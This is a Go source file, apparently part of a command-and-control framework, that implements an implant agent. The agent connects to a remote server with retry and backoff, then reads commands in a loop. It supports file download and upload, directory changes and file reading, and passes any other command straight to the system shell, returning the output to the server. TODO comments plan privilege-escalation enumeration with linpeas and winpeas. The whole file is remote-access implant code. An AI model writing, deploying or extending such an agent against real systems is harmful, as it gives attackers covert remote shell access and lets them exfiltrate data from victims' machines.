package agent

import (
	"fmt"
	"strings"
	"time"

	"konstantinovitz.com/kuang/internal/utils"
)

type Agent struct {
	Transport      AgentTransport
	MaxRetries     int
	BaseDelay      time.Duration
	CommandManager utils.CommandManager
}

type AgentTransport interface {
	Connect() error
	Read() (string, error)
	Write(data string) error
	Close() error
}

func (agent *Agent) Start() error {
	// TODO: detect OS and build correct CommandManager, ie. sysenum command runs lipeas on linux and winpeas on windows
	// TODO: note that this will increase the binary size compared to totally separate linux and windows builds, but who cares??
	agent.CommandManager.RegisterHandler("ping", handlePing)
	agent.CommandManager.RegisterHandler("download", handleDownloadFile)
	agent.CommandManager.RegisterHandler("upload", handleUploadFile)
	agent.CommandManager.RegisterHandler("cd", handleChangeDir)
	agent.CommandManager.RegisterHandler("cat", handleCat)
	agent.CommandManager.RegisterDefaultHandler(handleShellPassThrough)

	retries := 0
	for {
		err := agent.Transport.Connect()
		if err != nil {
			if retries >= agent.MaxRetries {
				return fmt.Errorf("Max retries reached. Exiting.")
			}
			retries++
			time.Sleep(agent.backoff(retries))
		} else {
			fmt.Println("Connected successfully.")
			agent.REPL()
			retries = 0
		}
	}
}

func (agent *Agent) REPL() {
	for {
		// Read command from the transport
		command, err := agent.Transport.Read()
		if err != nil {
			fmt.Println("Error reading command:", err)
			// Attempt to reconnect or exit if needed
			return
		}
		command = strings.TrimSpace(command)

		fmt.Println("Received command:", command)

		cmdSlice := strings.Split(command, " ")
		if len(cmdSlice) == 1 {
			cmdSlice = append(cmdSlice, cmdSlice[0])
		}

		res, err := agent.CommandManager.HandleCommand(cmdSlice[0], cmdSlice...)
		// TODO: make the agent correctly write erorr messages back to the server

		// Send the response back using the transport
		if err := agent.Transport.Write(res + "\nEND_OF_RESPONSE"); err != nil {
			fmt.Println("Error sending response:", err)
			return
		}
	}
}

func (agent *Agent) Stop() error {
	err := agent.Transport.Close()
	return err
}
